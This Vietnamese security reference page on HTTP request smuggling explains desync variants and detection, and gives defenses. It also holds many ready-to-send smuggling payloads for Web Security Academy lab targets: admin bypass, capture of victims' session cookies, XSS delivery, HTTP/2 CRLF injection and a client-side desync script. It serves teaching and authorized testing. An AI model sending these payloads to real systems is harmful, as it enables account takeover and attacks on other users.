# HTTP Request Smuggling

> Front-end/back-end bất đồng về ranh giới request, cho phép smuggle (lén đưa) request. **Tài liệu chuyên sâu:** [`Troubleshooting_Guide/http_request_smuggling.md`](../../../../Troubleshooting_Guide/http_request_smuggling.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Tên gọi khác / OWASP:** Desync · A05:2021
**Ngôn ngữ:** [English](README.md) · Tiếng Việt
**Trạng thái:** hoàn chỉnh

## Là gì (What it is)
HTTP request smuggling (HTTP desync) xảy ra khi một máy chủ front-end (proxy, load balancer, CDN) và một máy chủ back-end bất đồng về việc một request kết thúc ở đâu và request kế tiếp bắt đầu từ đâu. Kẻ tấn công khai thác sự bất đồng đó để "smuggle" một phần của một request sao cho nó được diễn giải như phần mở đầu của request kế tiếp trên kết nối dùng chung.

## Cơ chế hoạt động (How it works)
HTTP/1.1 cung cấp hai cách khai báo độ dài body — `Content-Length` và `Transfer-Encoding: chunked`. Nếu hai chặng (hop) trên đường đi ưu tiên các header khác nhau (hoặc một bên xử lý sai các header bị làm rối/trùng lặp), front-end và back-end phân tích luồng byte thành các ranh giới request khác nhau. Kẻ tấn công tạo một body mà các byte đuôi của nó bị back-end coi là phần mở đầu của một request mới, rồi nó được ghép vào trước request của người dùng kế tiếp trên kết nối tái sử dụng. Các biến thể HTTP/2 downgrade và CL.0 khai thác cùng sự nhầm lẫn ranh giới đó trong các khung định dạng khác nhau.

## Tác động (Impact)
Các phần mở đầu được smuggle vượt qua các kiểm soát bảo mật ở front-end (chạm tới `/admin`), đầu độc hàng đợi phản hồi dùng chung khiến nạn nhân nhận các phản hồi do kẻ tấn công kiểm soát, bắt được request của người dùng khác bao gồm cả cookie phiên, và đưa stored/reflected XSS tới bất kỳ ai có request rơi vào kế tiếp. Nó thường leo thang thành chiếm tài khoản hoàn toàn và được xếp hạng cao tới nghiêm trọng.

## Cách phát hiện (How to detect)
- Dò thời gian: một body chunked không hoàn chỉnh khiến một chặng chờ đợi sẽ gây độ trễ đo được (~5–10s) khi back-end tôn trọng `Transfer-Encoding`.
- Phản hồi khác biệt: smuggle một request tới một đường dẫn không tồn tại và quan sát một request lành tính theo sau trả về 404 bất ngờ (xác nhận desync).
- Thử làm rối TE (khoảng trắng đuôi, tab, gập dòng, giá trị TE trùng lặp/giả) và quan sát chặng nào ngừng tôn trọng chunked. Dùng các công cụ như HTTP Request Smuggler / Turbo Intruder của Burp.

## Khai thác (tóm tắt) (Exploitation)
Xác định biến thể (CL.TE, TE.CL, TE.TE, H2.TE/CL, CL.0) bằng dò thời gian và dò 404, rồi gửi một request mà body chứa một dòng request và các header được smuggle hoàn chỉnh. Back-end tiêu thụ phần mở đầu và áp dụng nó cho người dùng kết nối kế tiếp — cho phép bạn chạm tới các đường dẫn bị hạn chế, đầu độc hàng đợi phản hồi, hoặc bắt request của nạn nhân. Độ dài phải chính xác đến từng byte; payload đầy đủ và phép tính độ dài nằm trong mục Payload.

## Payload & kỹ thuật (Payloads & techniques)
> Chắt lọc từ các tài liệu payload thực chiến — chỉ dùng cho kiểm thử được cấp phép.

### Tham chiếu biến thể (Variant reference)
Lớp desync phụ thuộc vào việc mỗi chặng tin tưởng tín hiệu độ dài nào.

| Biến thể | Front-end đọc | Back-end đọc |
|---------|-----------------|----------------|
| CL.TE   | Content-Length | Transfer-Encoding |
| TE.CL   | Transfer-Encoding | Content-Length |
| CL.0    | Content-Length | Bỏ qua body |
| H2.TE   | Khung HTTP/2 | Header TE được tiêm |
| H2.CL   | HTTP/2 (không CL) | Header CL được chuyển tiếp |

### Dò thời gian (phát hiện desync) (Timing probes)
Cách không phá hủy để biết chặng nào tin tưởng TE trước khi tạo một desync hoàn chỉnh.

```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 4
Transfer-Encoding: chunked

1
A
X
```

Độ trễ (~10s) nghĩa là **back-end dùng TE** → vùng CL.TE/TE.CL. Phép dò đối xứng:

```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

Độ trễ nghĩa là **front-end dùng TE, back-end dùng CL** → tiềm năng CL.TE.

### Desync CL.TE / TE.CL / TE.TE
Front-end dùng CL, back-end dùng TE (gửi hai lần; phản hồi thứ hai: `Unrecognized method GPOST`):

```http
POST / HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

TE.CL — front-end dùng TE, back-end dùng CL (tắt "Update Content-Length" trong Burp):

```http
POST / HTTP/1.1
Host: TARGET.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

TE.TE — cả hai chặng đều hỗ trợ TE, nên làm rối header để chỉ một bên ngừng tôn trọng nó:

```http
POST / HTTP/1.1
Host: TARGET.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

Các biến thể làm rối TE khác để fuzz:

```text
Transfer-Encoding: xchunked
Transfer-Encoding : chunked     (trailing space before colon)
Transfer-Encoding:	chunked     (tab before value)
Transfer-Encoding
  : chunked                     (line folding)
```

### Xác nhận qua phản hồi khác biệt (Confirm via differential response)
Smuggle một request tới một đường dẫn không tồn tại; request lành tính kế tiếp trả về 404.

```http
POST / HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```

Dạng TE.CL (`0x5e` = 94 byte từ `POST /404` tới cuối `x=1`):

```http
POST / HTTP/1.1
Host: TARGET.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

### Vượt kiểm soát front-end (chạm /admin) (Bypass front-end controls)
Phần mở đầu được smuggle được back-end xử lý, bỏ qua các quy tắc truy cập của front-end.

```http
POST / HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

Dạng TE.CL (`0x71` = 113 byte):

```http
POST / HTTP/1.1
Host: TARGET.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

Nếu front-end viết lại request (ví dụ tiêm một header client-IP), trước tiên hãy rò rỉ tên header đã được viết lại, rồi tái sử dụng nó:

```http
POST / HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test
```

Phản hồi rò rỉ thứ gì đó như `X-vVNGcR-Ip: <front-end IP>`. Giả mạo nó thành localhost:

```http
POST / HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Length: 143
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-vVNGcR-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1
```

### Tấn công người dùng khác (Attacking other users)
Bắt một request đang trên đường của nạn nhân bằng cách smuggle một body bình luận quá khổ; tăng dần CL (400/600/800) cho tới khi bắt được toàn bộ request (kèm cookie).

```http
POST / HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 256
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=YOUR-SESSION

csrf=YOUR-CSRF&postId=5&name=x&email=x@x.com&website=&comment=test
```

Reflected XSS được đưa tới bất kỳ ai có request kế tiếp trong hàng đợi:

```http
POST / HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

GET /post?postId=5 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```

### Desync HTTP/2 (HTTP/2 desync)
Đầu độc hàng đợi phản hồi H2.TE — xác nhận (cứ mỗi request thứ hai trả về 404), rồi "câu" một 302 quản trị:

```http
POST / HTTP/2
Host: TARGET.web-security-academy.net
Transfer-Encoding: chunked

0

SMUGGLED
```

```http
POST /x HTTP/2
Host: TARGET.web-security-academy.net
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: TARGET.web-security-academy.net

```

H2.CL — một Content-Length được chuyển tiếp tách đôi body H2:

```http
POST / HTTP/2
Host: TARGET.web-security-academy.net
Content-Length: 0

SMUGGLED
```

Tiêm CRLF qua H2 — smuggle qua một giá trị header (trong Burp Inspector, Shift+Enter chèn một `\r\n` thật):

```text
Name:  foo
Value: bar\r\n Transfer-Encoding: chunked
```

```http
0

POST / HTTP/1.1
Host: TARGET.web-security-academy.net
Cookie: session=YOUR-SESSION
Content-Length: 800

search=x
```

Tách request hoàn toàn qua cùng một vector (trỏ path tới một `/x` không tồn tại):

```text
Name:  foo
Value: bar\r\n \r\n GET /x HTTP/1.1\r\n Host: TARGET.web-security-academy.net
```

### CL.0 và desync phía client (CL.0 and client-side desync)
Một số endpoint (thường là file tĩnh) bỏ qua body — back-end coi "body" như một request mới. Gửi hai request trên một kết nối keep-alive:

```http
POST /resources/images/blog.svg HTTP/1.1
Host: TARGET.web-security-academy.net
Cookie: session=YOUR-SESSION
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

GET /hopefully404 HTTP/1.1
Foo: x
```

```http
GET / HTTP/1.1
Host: TARGET.web-security-academy.net
```

Nếu request 2 trả về 404, CL.0 được xác nhận; thay phần mở đầu được smuggle bằng `GET /admin/delete?username=carlos`. Một vector CL.0 mà chính trình duyệt của nạn nhân có thể kích hoạt (desync phía client):

```javascript
fetch("https://TARGET.h1-web-security-academy.net", {
  method: "POST",
  body: "GET /hopefully404 HTTP/1.1\r\nFoo: x",
  mode: "cors",
  credentials: "include",
}).catch(() => {
  fetch("https://TARGET.h1-web-security-academy.net", {
    mode: "no-cors",
    credentials: "include",
  });
});
```

### Tính toán độ dài (Length calculation)
Content-Length đếm mọi byte sau dòng trống ngăn cách header với body — ví dụ `0\r\n\r\nGET /404 HTTP/1.1\r\nX-Ignore: X` = 35 byte. Kích thước chunk TE.CL (dạng hex) đếm tất cả byte của request được smuggle từ dòng đầu của nó cho tới hết body — ví dụ khối `POST /404` ở trên = 94 byte = `0x5e`.

## Phòng chống (Defenses)
1. Dùng HTTP/2 đầu-cuối (end-to-end) và không bao giờ downgrade về HTTP/1.1 giữa front-end và back-end (biện pháp giảm thiểu hiệu quả nhất duy nhất).
2. Chuẩn hóa request tại front-end: từ chối bất kỳ request nào chứa cả `Content-Length` lẫn `Transfer-Encoding`, hoặc bất kỳ header TE dị dạng/bị làm rối nào, thay vì chuyển tiếp nó.
3. Khiến front-end và back-end dùng cùng một bộ phân tích nghiêm ngặt, giống hệt nhau để xác định độ dài, để chúng không bao giờ bất đồng về ranh giới request.
4. Tắt việc tái sử dụng kết nối tới back-end (hoặc dùng kết nối mới cho mỗi request) khi khả thi để hạn chế tác động xuyên request.
5. Cập nhật bản vá cho các proxy, CDN và web server, vì nhiều lỗi desync là khiếm khuyết bộ phân tích của hãng.

## Tìm CVE từ đầu (Finding CVEs from scratch)
- **NVD** — https://nvd.nist.gov/vuln/search?query=HTTP+Request+Smuggling
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=HTTP+Request+Smuggling
- **Exploit-DB** — https://www.exploit-db.com/search?q=HTTP+Request+Smuggling
- **GitHub Advisories** — https://github.com/advisories?query=HTTP+Request+Smuggling
- **OSV** — https://osv.dev/list?q=HTTP+Request+Smuggling
- **Cộng đồng** — r/netsec, blog bảo mật của hãng, HackerOne Hacktivity, infosec trên X/Twitter.
- _Mẹo tìm kiếm: thêm sản phẩm + phiên bản mục tiêu, ví dụ `HTTP Request Smuggling <product> <version>`._

## Các CVE tiêu biểu (Notable CVEs)
_Mang tính minh họa — hãy kiểm chứng lại trên NVD trước khi trích dẫn._
- `CVE-2019-18277` — Request smuggling trong HAProxy qua xử lý sai `Transfer-Encoding`.
- `CVE-2021-33193` — Request smuggling trong Apache HTTP Server (mod_proxy/HTTP/2) cho phép cache poisoning và vượt kiểm soát truy cập.
- `CVE-2022-1388` (bối cảnh) và công trình rộng hơn năm 2019: nghiên cứu "HTTP Desync Attacks" của PortSwigger (James Kettle) là khối nghiên cứu thực tế kinh điển về các trường hợp smuggling có thể khai thác hàng loạt.

## Tham khảo (References)
- PortSwigger Web Security Academy — HTTP request smuggling: https://portswigger.net/web-security/request-smuggling
- OWASP — HTTP Request Smuggling (WSTG / OWASP wiki): https://owasp.org/www-community/attacks/HTTP_Request_Smuggling
- RFC 7230 §3.3.3 and RFC 9112 §6 — HTTP/1.1 message body length precedence rules.
